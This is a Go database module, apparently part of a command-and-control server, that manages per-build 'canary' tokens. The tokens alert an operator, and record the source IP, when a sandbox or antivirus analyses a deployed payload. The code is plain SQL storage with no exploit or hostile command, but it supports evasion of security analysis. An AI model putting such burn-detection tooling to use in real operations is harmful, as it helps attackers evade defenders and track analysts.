package db

import (
	"database/sql"
	"time"
)

// CanaryRow is a per-build burn-detection token. When a sandbox or AV
// dynamically analyses the payload, the agent's startup lookup for the canary
// is intercepted by the server and the operator gets a real-time burn alert.
type CanaryRow struct {
	Token       string
	BuildName   string
	Status      string // "armed" or "burned"
	RemoteIP    string
	TriggeredAt sql.NullTime
	CreatedAt   time.Time
}

// CreateCanary registers a new armed canary token.
func (d *Database) CreateCanary(token, buildName string) error {
	_, err := d.db.Exec(
		`INSERT INTO canaries(token, build_name, status) VALUES(?,?, 'armed')`,
		token, buildName,
	)
	return err
}

// BurnCanary marks a canary as triggered and records the source IP.
// Returns true if the canary existed and was previously armed.
func (d *Database) BurnCanary(token, remoteIP string) (bool, error) {
	res, err := d.db.Exec(
		`UPDATE canaries SET status='burned', remote_ip=?, triggered_at=CURRENT_TIMESTAMP
		 WHERE token=? AND status='armed'`,
		remoteIP, token,
	)
	if err != nil {
		return false, err
	}
	n, err := res.RowsAffected()
	if err != nil {
		return false, err
	}
	return n > 0, nil
}

// GetCanary returns a canary by token.
func (d *Database) GetCanary(token string) (*CanaryRow, error) {
	row := d.db.QueryRow(
		`SELECT token, build_name, status, COALESCE(remote_ip,''), triggered_at, created_at
		 FROM canaries WHERE token=?`, token,
	)
	var c CanaryRow
	var createdAt time.Time
	if err := row.Scan(&c.Token, &c.BuildName, &c.Status, &c.RemoteIP, &c.TriggeredAt, &createdAt); err != nil {
		return nil, err
	}
	c.CreatedAt = createdAt
	return &c, nil
}

// ListCanaries returns all canaries, most recently created first.
func (d *Database) ListCanaries(limit int) ([]CanaryRow, error) {
	if limit <= 0 || limit > 1000 {
		limit = 200
	}
	rows, err := d.db.Query(
		`SELECT token, build_name, status, COALESCE(remote_ip,''), triggered_at, created_at
		 FROM canaries ORDER BY created_at DESC LIMIT ?`, limit,
	)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []CanaryRow
	for rows.Next() {
		var c CanaryRow
		var createdAt time.Time
		if err := rows.Scan(&c.Token, &c.BuildName, &c.Status, &c.RemoteIP, &c.TriggeredAt, &createdAt); err != nil {
			return nil, err
		}
		c.CreatedAt = createdAt
		out = append(out, c)
	}
	return out, rows.Err()
}
